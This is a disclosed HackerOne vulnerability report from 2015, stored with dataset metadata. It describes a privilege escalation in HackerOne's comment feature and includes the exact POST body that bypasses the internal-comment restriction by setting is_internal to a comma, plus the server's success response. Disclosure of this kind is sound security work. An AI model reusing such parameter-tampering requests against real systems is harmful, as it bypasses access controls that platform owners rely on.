---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '107336'
original_report_id: '107336'
title: Team Member(s) associated with a  Group have Read-only permission (Post internal
  comments) can post comment to all the participants
weakness: Privilege Escalation
team_handle: security
created_at: '2015-12-29T13:53:21.708Z'
disclosed_at: '2016-01-27T21:19:30.102Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- privilege-escalation
---

# Team Member(s) associated with a  Group have Read-only permission (Post internal comments) can post comment to all the participants

## Metadata

- HackerOne Report ID: 107336
- Weakness: Privilege Escalation
- Program: security
- Disclosed At: 2016-01-27T21:19:30.102Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello Hackerone,

I find bug with it 
team Member(s) associated with a  Group have only permission (Post internal comments) can post comment to all the participants 

Bypass it just with Add comma  ','      is_internal=, 


message=test&substate=&is_internal=,&reference=&add_reporter_to_original=false&reply_action=add-comment&reports_count=1&report_ids%5B%5D=107329

response 
{"flash":"Comment was created successfully.","reports":[{"latest_activity":"2015-12-29T13:35:34.210Z","id":107329,"url":"https://hackerone.com/reports/107329","title":"Demo report: XSS in \u003chttp://a\u003e home page","state":"open","substate":"new","readable_substate":"New","created_at":"2015-12-29T12:48:29.534Z","reporter":{"username":"demo-researcher","url":"https://hackerone.com/demo-researcher"},"team":{"id":1607,"url":"https://hackerone.com/testtest10","handle":"testtest10","name":"\u003chttp://a\u003e","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/production/000/001/607/fe7b2a22db2cef08c85e527846ecffc358a396de_small.png?1430615268","medium":"https://profile-photos.hackerone-user-content.com/production/000/001/607/b6ddcfa6d5ff3f1b8703197372452b3278c61869_medium.png?1430615268"},"permissions":[]}}]}


PoC video:https://www.dropbox.com/s/sxvzyqlyz5silt7/Hackerone.mov?dl=0


Thanks 

Hadji Samir

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
